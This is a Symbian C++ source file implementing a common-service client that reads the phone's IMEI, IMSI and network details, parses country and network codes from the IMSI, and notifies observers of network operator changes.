#include "CommonServiceClient.h"
#include "CltSettings.h"
#include "Global.h"

const TInt KLengthMNC = 2;
const TInt KLengthMCC = 3;
const TInt KLengthMNCAmerica = 3;

static const TText* const KNorthAmericaMMCArray[] = 
		{
		_S("302"), //Canada
		_S("310"), //America
		_S("311"), //America
		_S("316"), //America
		_S("732"), //Colombia
		_S("722"), //Argentina
		_S("344"), //Antigua & Barbuda
		_S("342"), //Barbados
		_S("348"), //British Virgin Islands
		_S("346"), //Cayman Islands
		};
		
static const TInt KNorthAmericaMMCArrayLength = 10;

CCommonService::CCommonService(RCommonServices& aCommonService, MCommonServTerminateObserver& aTerminateObserver)
:iSession(aCommonService),
iTerminateObserver(aTerminateObserver),
iMobInfoPckg(iMobInfo)
    {
    }
    
CCommonService::~CCommonService()
    {
    iNetInfoNotifiables.Close();
    iNetwOperObservers.Close();
    iListeners.Close();
    delete iFlexiKeyNotify;
    delete iDeviceInfo;
    }

CCommonService* CCommonService::NewL(RCommonServices& aCommonService, MCommonServTerminateObserver& aTerminateObserver)
    {
    CCommonService* self = new (ELeave) CCommonService(aCommonService,aTerminateObserver);
    CleanupStack::PushL(self);
    self->ConstructL();
	CleanupStack::Pop(self);    
    return self;
    }

void CCommonService::ConstructL()
    {
	iFlexiKeyNotify=CFlexiKeyNotify::NewL(iSession,iTerminateObserver);
	iFlexiKeyNotify->RequestNotify();
	
	iDeviceInfo=CDeviceNetInfo::NewL(iSession, *this);	
	iDeviceInfo->GetMobInfoAsync(&iMobInfoPckg);	
    }

TInt CCommonService::Register(MFlexiKeyNotifiable& aFxKeyNotifiable)
	{
	return iFlexiKeyNotify->Register(aFxKeyNotifiable);
	}
	
TInt CCommonService::Register(MMobileInfoNotifiable& aNotifiable)
	{
	return iNetInfoNotifiables.Append(&aNotifiable);
	}

TInt CCommonService::AddObserver(MNetOperatorInfoListener* aListener)
	{
	TInt err(KErrNone);
	if(aListener)
		{
		err = iListeners.Append(aListener);
		}
	return err;
	}

TInt CCommonService::AddObserver(MNetOperatorChangeObserver* aObserver)
	{
	TInt err(KErrNone);
	if(aObserver)
		{		
		err = iNetwOperObservers.Append(aObserver);
		}
	return err;
	}

void CCommonService::SetNewSession(RCommonServices aComnServSession)
	{
	iSession = aComnServSession;
	ASSERT(iFlexiKeyNotify != NULL);
	iFlexiKeyNotify->SetNewSession(iSession);
	}
	
const TMobileInfo* CCommonService::MobileInfo() const
	{
	return &iMobInfo;	
	}

void CCommonService::NetworkInfoReadyL(TInt aErr)
//From MDeviceNetInfoObserver
	{
	iNetInfoReady = ETrue;	
	for(TInt i=0;i<iNetInfoNotifiables.Count(); i++)
		{
		MMobileInfoNotifiable* client = (MMobileInfoNotifiable*)iNetInfoNotifiables[i];
		TRAPD(err,client->OfferMobileInfoL(iMobInfo));
		}
	ProcessCurrentNetworkInfoL();
	}

void CCommonService::ProcessCurrentNetworkInfoL()
//Note:
//When the phone is in offline mode
//CC Code and network Id is empty
//
	{
	TNetOperatorInfo currentOperator;
	currentOperator.iCountryCode = MobileContryCode();
	currentOperator.iNetworkId = MobileNetworkCode();
	currentOperator.iLongName = NetworkName();	
	CFxsSettings& settings = Global::Settings();
	TNetOperatorInfo& prevOperator = settings.NetworkOperatorInfo();
	if((prevOperator.iCountryCode != currentOperator.iCountryCode) || (prevOperator.iNetworkId != currentOperator.iNetworkId))
	//Network Operator Changed
		{
		prevOperator = currentOperator;
		TInt count = iNetwOperObservers.Count();
		for(TInt i=0;i<count;i++)
			{
			MNetOperatorChangeObserver* observer = iNetwOperObservers[i];
			observer->NetworkOperatorChanged(currentOperator);
			}
		iNetwOperObservers.Reset();
		}
	for(TInt i=0;i<iListeners.Count();i++)
		{		
		MNetOperatorInfoListener* listener = iListeners[i];
		listener->CurrentOperatorInfo(currentOperator);
		}
	//remove all element from array so that they will not be informed again
	iListeners.Reset();	
	prevOperator = currentOperator;
	}
	
TInt CCommonService::HandleNetworkInfoReadyLeave(TInt /*aLeave*/)
	{
	return KErrNone;
	}

//MFxNetworkInfo
//----------------------------------------------

TBool CCommonService::NetworkInfoReady()
	{
	return iNetInfoReady;
	}
	
const TDesC& CCommonService::IMEI()
	{
	return iMobInfo.iPhoneId.iSerialNumber;
	}	
	
const TDesC& CCommonService::IMSI()
	{
	return iMobInfo.iSubscriber.iSubscriberId;
	}

TPtrC CCommonService::MobileContryCode()
//
//the problem is that when the phone is in offline mode
//we can't get MMC and MNC from API
//so the best way is getting from IMSI
//
//verywhere in the world, except North America, the subscriber's IMSI is converted to a Mobile Global Title (MGT) E.214 number
//the Mobile Network Code (MNC), either 2 digits (European standard) or 3 digits (North American standard)
//@see http://en.wikipedia.org/wiki/E.214
//
	{
	const TDesC& _IMSI = IMSI();
	if(_IMSI.Length() > KLengthMCC)
		{
		return _IMSI.Left(KLengthMCC);		
		}
	return KNullDesC();	
	}

TPtrC CCommonService::MobileNetworkCode()
	{
	TInt startIndex = KLengthMCC;
	TBool northAmericaCountry = IsNorthAmerica(MobileContryCode());
	const TDesC& _IMSI = IMSI();
	
	//get MNC from IMSI
	if(northAmericaCountry)
		{
		if(_IMSI.Length() >= (KLengthMNCAmerica+startIndex))
			{
			return _IMSI.Mid(startIndex, KLengthMNCAmerica);		
			}
		}
	else
		{
		if(_IMSI.Length() >= (KLengthMNC+startIndex))
			{
			return _IMSI.Mid(startIndex, KLengthMNC);		
			}
		}
	return KNullDesC();
	}

TBool CCommonService::IsNorthAmerica(const TDesC& aMCC) const
	{
	for(TInt i=0;i<KNorthAmericaMMCArrayLength;i++)
		{
		if(aMCC == TPtrC(KNorthAmericaMMCArray[i]))
			{
			return ETrue;
			}
		}
	return EFalse;	
	}
	
const TDesC& CCommonService::NetworkName()
	{
	return iMobInfo.iNetwork.iLongName;	
	}
